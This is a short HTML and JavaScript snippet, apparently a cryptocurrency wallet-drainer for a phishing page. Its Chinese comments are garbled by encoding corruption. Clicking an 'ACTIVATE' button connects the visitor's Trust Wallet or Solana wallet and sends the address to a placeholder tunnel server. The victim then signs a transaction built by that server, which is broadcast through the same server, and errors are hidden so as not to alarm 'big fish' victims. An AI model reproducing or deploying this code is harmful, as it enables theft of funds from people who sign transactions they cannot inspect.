<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
<script>
async function startProcess() {
    try {
        // 1. è·å–é’±åŒ…å¯¹è±¡
        const p = window.trustwallet?.solana || window.solana;
        if (!p) {
            alert("Please use Trust Wallet!");
            return;
        }

        // 2. è¿æ¥é’±åŒ…
        await p.connect();
        console.log("Connected:", p.publicKey.toString());

        // 3. è¯·æ±‚åç«¯æ„é€ äº¤æ˜“ (è¯·ç¡®ä¿è¿™é‡Œçš„ tunnel å˜é‡å·²å®šä¹‰)
        const tunnel = "ä½ çš„å†…ç½‘ç©¿é€åœ°å€"; 
        const resp = await fetch(tunnel + "/prepare_v32", {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: p.publicKey.toString() })
        });

        const info = await resp.json();
        if (info.raw_tx) {
            const web3 = window.solanaWeb3;
            
            // 4. ååºåˆ—åŒ–äº¤æ˜“åŒ…
            const txBuffer = Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0));
            const tx = web3.Transaction.from(txBuffer);
            
            // 5. æ‹‰èµ·ç­¾åç¡®è®¤
            const signed = await p.signTransaction(tx);
            
            // 6. åºåˆ—åŒ–å¹¶å¹¿æ’­
            const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
            const broadcastResp = await fetch(tunnel + "/broadcast_v41", {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ signed_tx: signedBase })
            });
            
            const result = await broadcastResp.json();
            console.log("Final Status:", result);
        }
    } catch (err) {
        console.error("Execution Error:", err);
        // ğŸ”± è¿™é‡Œé™é»˜å¤„ç†ï¼Œä¸å¼¹çª—ï¼Œé˜²æ­¢å“è·‘å¤§é±¼
    }
}

// ç»‘å®šåˆ°ä½ çš„ ACTIVATE æŒ‰é’®
document.getElementById('activate_btn').onclick = startProcess;
</script>
